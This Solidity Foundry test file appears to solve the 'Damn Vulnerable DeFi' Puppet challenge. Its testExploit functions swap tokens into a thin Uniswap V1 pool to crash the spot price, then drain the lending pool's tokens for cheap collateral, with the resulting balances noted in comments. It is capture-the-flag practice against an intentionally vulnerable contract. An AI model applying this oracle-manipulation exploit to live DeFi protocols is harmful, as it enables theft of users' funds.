// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";

import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../Contracts/puppet/PuppetPool.sol";

import {Strings} from "openzeppelin-contracts/utils/Strings.sol";

import "ds-test/test.sol";




interface UniswapV1Exchange {
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    ) external payable returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold)
        external
        view
        returns (uint256);
    
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);

}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract Puppet is DSTest, stdCheats {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    DamnValuableToken internal dvt;
    PuppetPool internal puppetPool;
    address payable internal attacker;

    uint256 DVTasked;
    uint256 ETHneed;

    uint DVTspent;
    uint ETHgot;

    string str89;
    string str90;
    string str91;



    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        uniswapV1Factory = UniswapV1Factory(
            deployCode("./src/build-uniswap/v1/UniswapV1Factory.json")
        );

        // Deploy a exchange that will be used as the factory template
        uniswapV1ExchangeTemplate = UniswapV1Exchange(
            deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json")
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        uniswapExchange = UniswapV1Exchange(
            uniswapV1Factory.createExchange(address(dvt))
        );

        vm.label(address(uniswapExchange), "Uniswap Exchange");

        // Deploy the lending pool
        puppetPool = new PuppetPool(address(dvt), address(uniswapExchange));
        vm.label(address(puppetPool), "Puppet Pool");

        // Add initial token and ETH liquidity to the pool
        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE, // max_tokens
            DEADLINE // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );
        vm.startPrank(attacker);
        dvt.approve(address(uniswapExchange), 2 ** 256 - 1);
        
        // console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }


    function testExploit0() public {

        // Action 1 UniswapDVT2ETH: DVT[given] -> ETH   State: uniswapExchange
        //           State: uniswapExchange       
        uniswapExchange.tokenToEthSwapInput(1000e18, 1, DEADLINE);

        //  prestate: DVT:  100000 ETH:  100000
        //  poststate: DVT:  10100000 ETH:  993
        //  ETHgot = 99006


        // Action 2 Borrow: ETH -> DVT[given]   State: uniswapExchange
        //           State: uniswapExchange

        DVTasked = dvt.balanceOf(address(puppetPool));
        ETHneed = puppetPool.calculateDepositRequired( DVTasked );
        puppetPool.borrow{value: ETHneed}( dvt.balanceOf(address(puppetPool)) );



        revert(ProfitSummary());


    
        // vm.stopPrank();
    }


    function testExploit1() public {

        // Action 1: DVT[given] -> ETH   State: uniswapExchange
        //           State: uniswapExchange       
        ETHgot = attacker.balance;
        str89 = UniswapSummary();
        uniswapExchange.tokenToEthSwapInput(1000e18, 1, DEADLINE);
        str90 = UniswapSummary();
        ETHgot = attacker.balance - ETHgot;
        // 
        revert( appendWithSpace( str89, appendWithSpace( str90, uint2str(ETHgot / 10 ** 18) ) ) );
        //  prestate: DVT:  100000 ETH:  100000
        //  poststate: DVT:  10100000 ETH:  993
        //  ETHgot = 99006


        // Action 2: ETH -> DVT[given]   State: uniswapExchange
        //           State: uniswapExchange

        DVTasked = dvt.balanceOf(address(puppetPool));
        ETHneed = puppetPool.calculateDepositRequired( DVTasked );
        puppetPool.borrow{value: ETHneed}( dvt.balanceOf(address(puppetPool)) );



    
        // vm.stopPrank();
    }


    function testExploit2() public {
        
        // Action 1 SwapUniswapDVT2ETH: DVT[given] -> ETH   State: uniswapExchange
        //           State: uniswapExchange       
        // ETHgot = attacker.balance;
        // str89 = UniswapSummary();
        uniswapExchange.tokenToEthSwapInput(1000e18, 1, DEADLINE);
        // str90 = UniswapSummary();
        // ETHgot = attacker.balance - ETHgot;
        //

        // revert( appendWithSpace( str89, appendWithSpace( str90, uint2str(ETHgot / 10 ** 18) ) ) );
        //  prestate: DVT:  100000 ETH:  100000
        //  poststate: DVT:  10100000 ETH:  993
        //  ETHgot = 99006


        // Action 2 PoolBorrow: ETH -> DVT[given]   State: uniswapExchange
        //           State: puppetPool

        DVTasked = dvt.balanceOf(address(puppetPool));  // 100000
        str89 = UniswapSummary(); // 2 + 1 + 1 + 1
        str90 = puppetPoolSummary();
        ETHneed = puppetPool.calculateDepositRequired( DVTasked );
        puppetPool.borrow{value: ETHneed}( DVTasked );
        str91 = puppetPoolSummary();
        str90 = appendWithSpace( str90, str91 );

        revert( appendWithSpace( str89, appendWithSpace( str90, uint2str(ETHneed / 10 ** 18) ) ) );

        //  prestate: DVT:  10100000 ETH:  993  DVT reserve:  1000000000
        //  poststate: DVT:  10100000 ETH:  993  DVT reserve:  0
        //  ETHneed = 196643
    
        // vm.stopPrank();
    }


    function UniswapSummary() public view returns  (string memory _uintAsString){
        uint balance1 = dvt.balanceOf(address(uniswapExchange)) / 10 ** 18;
        uint balance2 = address(uniswapExchange).balance / 10 ** 18;
        return appendWithSpace(appendWithSpace("DVT: ", uint2str(balance1)), appendWithSpace("ETH: ", uint2str(balance2)));
    }

    function puppetPoolSummary() public view returns  (string memory _uintAsString){
        uint balance = dvt.balanceOf(address(puppetPool)) / 10 ** 18;
        return appendWithSpace("DVT reserve: ", uint2str(balance));
    }


    function ProfitSummary() public view returns  (string memory _uintAsString){
        uint balance = dvt.balanceOf(attacker) / 10 ** 18;
        uint balance2 = address(puppetPool).balance / 10 ** 18;
        return appendWithSpace(appendWithSpace("DVT: ", uint2str(balance)), appendWithSpace("ETH: ", uint2str(balance2)));

        // original balances:
        // Uniswap V1: 10 DVT  10 ETH
        // attacker: 1000 DVT  25 ETH
        // puppetPool: 100_000 DVT
        // 1 ether = 1000 DVT
        // Try to get as many DVT as possible while keeping ETH as much as possible 
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(
        uint256 input_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) internal returns (uint256) {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        return Strings.toString(_i);
    }
                
                
    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }
                
    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


}
